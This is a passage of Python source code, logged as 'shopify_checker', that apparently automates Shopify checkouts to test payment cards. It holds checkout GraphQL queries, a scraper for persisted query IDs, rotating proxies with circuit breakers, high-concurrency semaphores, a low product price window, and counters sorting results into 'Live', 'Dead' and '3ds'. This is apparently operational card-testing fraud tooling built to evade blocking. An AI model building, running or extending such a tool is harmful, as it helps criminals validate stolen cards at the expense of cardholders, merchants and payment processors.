paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

# ============================================================
# Persisted IDs
# ============================================================
PERSISTED_IDS = {
    "Proposal":            "309818bc347609fe16fc20fe9ceeea7a131dc0bdf882e7548834fa9d25cf7b8a",
    "SubmitForCompletion": "4ffaae6692ca0c625454c15d8a9793226c6189cf8e1c9891fad3edc36f678250",
    "PollForReceipt":      "b6c50b595c99059d846ceee679b75e8c5b313448841a30b27acda578819edb2c",
}
USE_PERSISTED_ENDPOINT = True


# ============================================================
# QID Scraper — ديناميكية معرفات Persisted Queries
# آمن: عند أي فشل يعود إلى PERSISTED_IDS الافتراضية
# ============================================================
_QIDS_CACHE: Dict[str, tuple] = {}
_QIDS_CACHE_LOCK = asyncio.Lock()
_QIDS_TTL = 3600.0

_QID_CTX: contextvars.ContextVar = contextvars.ContextVar(
    "shopify_qids", default=None
)

_QID_PATTERNS = (
    r'\{{id:"([a-f0-9]{{64}})",type:"\w+",name:"{op}"',
    r'\{{id:"([a-f0-9]{{64}})",name:"{op}"',
    r'name:"{op}"[^}}]{{0,2000}}?id:"([a-f0-9]{{64}})"',
    r'id:"([a-f0-9]{{64}})"[^}}]{{0,2000}}?name:"{op}"',
    r'"{op}"\s*:\s*"([a-f0-9]{{64}})"',
)

_QID_OPS = ("Proposal", "SubmitForCompletion",
            "PollForReceipt", "ActivatedExtensionMetafields")


def _find_js_urls(html_text: str, base_url: str) -> List[str]:
    urls = set()
    try:
        p = urlparse(base_url)
        origin = f"{p.scheme}://{p.netloc}"
        for m in re.finditer(
            r'(?:src|href)=["\']([^"\']+\.js[^"\']*)["\']',
            html_text or "",
        ):
            u = m.group(1)
            if u.startswith("//"):
                u = "https:" + u
            elif u.startswith("/"):
                u = origin + u
            elif not u.startswith("http"):
                u = origin + "/" + u.lstrip("/")
            urls.add(u)
    except Exception:
        pass
    return sorted(urls)


async def _scrape_qids_from_js(session, js_url: str, referer: str, proxy):
    try:
        kw = {"headers": {"accept": "*/*", "referer": referer}, "timeout": 3}
        if proxy:
            kw["proxy"] = proxy
        r = await session.get(js_url, **kw)
        if r.status_code != 200:
            return {}
        js = r.text or ""
        if len(js) < 500 or len(js) > 2_000_000:
            return {}
        hits = {}
        for op in _QID_OPS:
            for pat in _QID_PATTERNS:
                try:
                    m = re.search(pat.format(op=op), js)
                except re.error:
                    m = None
                if m:
                    hits[op] = m.group(1)
                    break
        return hits
    except Exception:
        return {}


async def scrape_qids(session, checkout_html: str, checkout_url: str,
                      proxy=None, deadline: float = 12.0) -> Dict[str, str]:
    js_urls = _find_js_urls(checkout_html, checkout_url)[:30]
    if not js_urls:
        return {}
    tasks = [
        _scrape_qids_from_js(session, u, checkout_url, proxy)
        for u in js_urls
    ]
    try:
        done = await asyncio.wait_for(
            asyncio.gather(*tasks, return_exceptions=True),
            timeout=deadline,
        )
    except asyncio.TimeoutError:
        return {}
    result: Dict[str, str] = {}
    for h in done:
        if isinstance(h, dict):
            for k, v in h.items():
                if v and k not in result:
                    result[k] = v
    return result


async def _get_or_scrape_qids(build_id, session, html, url, proxy):
    if not build_id:
        return None
    now = time.time()
    async with _QIDS_CACHE_LOCK:
        entry = _QIDS_CACHE.get(build_id)
        if entry and now - entry[1] < _QIDS_TTL:
            return dict(entry[0])
    discovered = await scrape_qids(session, html, url, proxy)
    if discovered:
        async with _QIDS_CACHE_LOCK:
            _QIDS_CACHE[build_id] = (dict(discovered), time.time())
    return discovered or None


def _json_dumps(obj) -> bytes:
    return json.dumps(obj, separators=(",", ":")).encode()


def _json_loads(data):
    if isinstance(data, bytes):
        data = data.decode("utf-8", errors="ignore")
    return json.loads(data)


# ============================================================
# Logging
# ============================================================
logger = logging.getLogger("shopify_checker")
if not logger.handlers:
    logging.basicConfig(
        level=getattr(logging, os.environ.get("LOG_LEVEL", "INFO").upper(), logging.INFO),
        format="%(asctime)s - %(levelname)s - %(message)s",
    )


# ============================================================
# Config
# ============================================================
_CFG = {
    "MAX_CONCURRENT": 150,
    "MAX_PER_SITE_INITIAL": 10,
    "MAX_PER_SITE_MIN": 3,
    "MAX_PER_SITE_MAX": 25,
    "MAX_PER_USER": 100,
    "CB_PROXY_FAIL_THRESHOLD": 5,
    "CB_PROXY_COOLDOWN_SEC": 300,
    "CB_SITE_FAIL_THRESHOLD": 3,
    "CB_SITE_COOLDOWN_SEC": 60,
    "CB_MAX_TRACKED": 500,
    "ADAPTIVE_SUCCESS_STREAK": 10,
    "ADAPTIVE_FAIL_STREAK": 5,
    "METRICS_WINDOW": 2000,
    "PRODUCTS_CACHE_TTL": 120,
    "PRODUCTS_CACHE_MAX": 500,
    "PRODUCTS_CACHE_KEEP_RATIO": 0.8,
    "PRODUCTS_CACHE_STALE_MULT": 5.0,
    "CLEANUP_INTERVAL_SEC": 120,
    "MIN_PRICE": 0.5,
    "MAX_PRICE": 100.0,
    "POLL_ATTEMPTS": 15,
    "POLL_MAX_DELAY": 4.0,
}


def _cfg(key, default=None):
    env_val = os.environ.get(key)
    if env_val is None:
        return _CFG.get(key, default)
    ref = _CFG.get(key, default)
    if isinstance(ref, bool):
        return env_val.strip().lower() in ("1", "true", "yes", "on")
    if isinstance(ref, int) and not isinstance(ref, bool):
        try:
            return int(env_val)
        except ValueError:
            return ref
    if isinstance(ref, float):
        try:
            return float(env_val)
        except ValueError:
            return ref
    return env_val


# ============================================================
# Metrics
# ============================================================
_METRICS = Counter({
    "Live": 0, "Dead": 0, "3ds": 0, "SITE_ERROR": 0,
    "PROXY_ERROR": 0, "AMBIGUOUS": 0, "CAPTCHA": 0,
    "TIMEOUT": 0, "ORDER_PROCESSING": 0, "total_requests": 0,
})
_METRICS_LOCK = asyncio.Lock()
_LATENCIES = deque(maxlen=_cfg("METRICS_WINDOW", 2000))
_ACTIVE_WORKERS = 0


# ============================================================
# Proxy Circuit Breaker
# ============================================================
class ProxyCircuitBreaker:
    def __init__(self):
        self._fails = {}
        self._dead_until = {}
        self._lock = asyncio.Lock()
        self._threshold = _cfg("CB_PROXY_FAIL_THRESHOLD", 5)
        self._cooldown = _cfg("CB_PROXY_COOLDOWN_SEC", 300)
        self._max_tracked = _cfg("CB_MAX_TRACKED", 500)

    async def record_success(self, proxy):
        if not proxy:
            return
        async with self._lock:
            self._fails.pop(proxy, None)
            self._dead_until.pop(proxy, None)

    async def record_fail(self, proxy):
        if not proxy:
            return
        async with self._lock:
            self._fails[proxy] = self._fails.get(proxy, 0) + 1
            if self._fails[proxy] >= self._threshold:
                self._dead_until[proxy] = time.time() + self._cooldown
                self._fails[proxy] = 0
            if len(self._fails) > self._max_tracked:
                sorted_fails = sorted(self._fails.items(), key=lambda x: x[1])
                to_remove = len(self._fails) - int(self._max_tracked * 0.8)
                for k, _ in sorted_fails[:to_remove]:
                    self._fails.pop(k, None)

    async def is_healthy(self, proxy):
        if not proxy:
            return False
        async with self._lock:
            until = self._dead_until.get(proxy, 0)
            if until > time.time():
                return False
            self._dead_until.pop(proxy, None)
            return True


# ============================================================
# Site Circuit Breaker
# ============================================================
class SiteCircuitBreaker:
    def __init__(self):
        self._fails = {}
        self._dead_until = {}
        self._lock = asyncio.Lock()
        self._threshold = _cfg("CB_SITE_FAIL_THRESHOLD", 3)
        self._cooldown = _cfg("CB_SITE_COOLDOWN_SEC", 60)
        self._max_tracked = _cfg("CB_MAX_TRACKED", 500)

    async def record_success(self, domain):
        if not domain:
            return
        async with self._lock:
            self._fails.pop(domain, None)
            self._dead_until.pop(domain, None)

    async def record_fail(self, domain):
        if not domain:
            return
        async with self._lock:
            self._fails[domain] = self._fails.get(domain, 0) + 1
            if self._fails[domain] >= self._threshold:
                self._dead_until[domain] = time.time() + self._cooldown
                self._fails[domain] = 0
            if len(self._fails) > self._max_tracked:
                sorted_fails = sorted(self._fails.items(), key=lambda x: x[1])
                to_remove = len(self._fails) - int(self._max_tracked * 0.8)
                for k, _ in sorted_fails[:to_remove]:
                    self._fails.pop(k, None)

    async def is_healthy(self, domain):
        if not domain:
            return False
        async with self._lock:
            until = self._dead_until.get(domain, 0)
            if until > time.time():
                return False
            self._dead_until.pop(domain, None)
            return True


# ============================================================
# Adaptive Semaphore
# ============================================================
class AdaptiveSemaphore:
    def __init__(self, initial, min_v, max_v, success_thresh, fail_thresh):
        self.limit = initial
        self.min = min_v
        self.max = max_v
        self._succ_t = success_thresh
        self._fail_t = fail_thresh
        self._cur = 0
        self._cond = asyncio.Condition()
        self._succ_streak = 0
        self._fail_streak = 0

    async def __aenter__(self):
        async with self._cond:
            while self._cur >= self.limit:
                await self._cond.wait()
            self._cur += 1
        return self

    async def __aexit__(self, *exc):
        async with self._cond:
            self._cur -= 1
            self._cond.notify()

    async def on_success(self):
        async with self._cond:
            self._succ_streak += 1
            self._fail_streak = 0
            if self._succ_streak >= self._succ_t and self.limit < self.max:
                self.limit = min(self.limit + 2, self.max)
                self._succ_streak = 0
                self._cond.notify_all()

    async def on_fail(self):
        async with self._cond:
            self._fail_streak += 1
            self._succ_streak = 0
            if self._fail_streak >= self._fail_t and self.limit > self.min:
                self.limit = max(self.limit // 2, self.min)
                self._fail_streak = 0


# ============================================================
# Site Semaphore Manager
# ============================================================
class SiteSemaphoreManager:
    def __init__(self):
        self._semaphores = {}
        self._refs = {}
        self._lock = asyncio.Lock()

    async def acquire(self, domain):
        async with self._lock:
            if domain not in self._semaphores:
                self._semaphores[domain] = AdaptiveSemaphore(
                    initial=_cfg("MAX_PER_SITE_INITIAL", 10),
                    min_v=_cfg("MAX_PER_SITE_MIN", 3),
                    max_v=_cfg("MAX_PER_SITE_MAX", 25),
                    success_thresh=_cfg("ADAPTIVE_SUCCESS_STREAK", 10),
                    fail_thresh=_cfg("ADAPTIVE_FAIL_STREAK", 5),
                )
                self._refs[domain] = 0
            self._refs[domain] += 1
            return self._semaphores[domain]

    async def release(self, domain):
        async with self._lock:
            if domain not in self._refs:
                return
            self._refs[domain] -= 1
            if self._refs[domain] <= 0:
                self._semaphores.pop(domain, None)
                self._refs.pop(domain, None)


# ============================================================
# Proxy Manager
# ============================================================
class ProxyManager:
    def __init__(self):
        self._stats = {}
        self._sticky = {}
        self._sticky_ts = {}
        self._lock = asyncio.Lock()
        self._fallback_cache = {"loaded_at": 0.0, "list": []}

    def parse(self, s):
        if not s:
            return None
        s = s.replace(" ", "").strip()
        if s.lower().startswith(('http://', 'https://', 'socks5://', 'socks5h://',
                                  'socks4://', 'socks4a://', 'socks://')):
            return s
        if '@' in s:
            return f"http://{s}"
        parts = s.split(':')
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return f"http://{s}"

    def _load_fallback(self):
        now = time.time()
        if now - self._fallback_cache["loaded_at"] < 60 and self._fallback_cache["list"]:
            return self._fallback_cache["list"]
        data_dir = os.getenv('DATA_DIR', os.path.dirname(os.path.abspath(__file__)))
        files = [
            os.path.join(data_dir, 'proxies.txt'),
            os.path.join(data_dir, 'st_proxies.txt'),
            os.path.join(data_dir, 'gw_proxies.txt'),
        ]
        all_p = []
        for f in files:
            if os.path.exists(f):
                try:
                    with open(f, 'r', encoding='utf-8') as fh:
                        for line in fh:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                p = self.parse(line)
                                if p and "example.com" not in p:
                                    all_p.append(p)
                except Exception:
                    pass
        self._fallback_cache["loaded_at"] = now
        self._fallback_cache["list"] = all_p
        return all_p

    def _score(self, proxy):
        s = self._stats.get(proxy, {"success": 0, "fail": 0})
        total = s.get("success", 0) + s.get("fail", 0)
        return 0.5 if total == 0 else s.get("success", 0) / total

    async def get_or_assign(self, checkout_id, current_proxy):
        if not checkout_id:
            return current_proxy
        async with self._lock:
            if checkout_id in self._sticky:
                return self._sticky[checkout_id]
            if current_proxy:
                self._sticky[checkout_id] = current_proxy
                self._sticky_ts[checkout_id] = time.time()
                return current_proxy
            candidates = self._load_fallback()
            if not candidates:
                return None
            clean = [p for p in candidates if self._score(p) >= 0.2]
            if not clean:
                clean = candidates
            clean.sort(key=self._score, reverse=True)
            top = clean[:max(1, len(clean) // 3)]
            chosen = random.choice(top) if top else None
            if chosen:
                self._sticky[checkout_id] = chosen
                self._sticky_ts[checkout_id] = time.time()
            return chosen

    async def record_success(self, proxy):
        if not proxy:
            return
        async with self._lock:
            s = self._stats.setdefault(proxy, {"success": 0, "fail": 0, "last_fail": 0.0})
            s["success"] += 1

    async def record_fail(self, proxy):
        if not proxy:
            return
        async with self._lock:
            s = self._stats.setdefault(proxy, {"success": 0, "fail": 0, "last_fail": 0.0})
            s["fail"] += 1
            s["last_fail"] = time.time()

    async def release(self, checkout_id):
        if not checkout_id:
            return
        async with self._lock:
            self._sticky.pop(checkout_id, None)
            self._sticky_ts.pop(checkout_id, None)

    async def cleanup_stale(self, max_age=300):
        now = time.time()
        async with self._lock:
            stale = [k for k, ts in self._sticky_ts.items() if now - ts > max_age]
            for k in stale:
                self._sticky.pop(k, None)
                self._sticky_ts.pop(k, None)
            if len(self._sticky_ts) > 5000:
                sorted_ts = sorted(self._sticky_ts.items(), key=lambda x: x[1])
                to_remove = len(self._sticky_ts) - 2500
                for k, _ in sorted_ts[:to_remove]:
                    self._sticky.pop(k, None)
                    self._sticky_ts.pop(k, None)


# ============================================================
# Global + User Semaphores
# ============================================================
_global_semaphore = None
_global_semaphore_lock = asyncio.Lock()
_user_semaphores = {}
_user_semaphore_lock = asyncio.Lock()


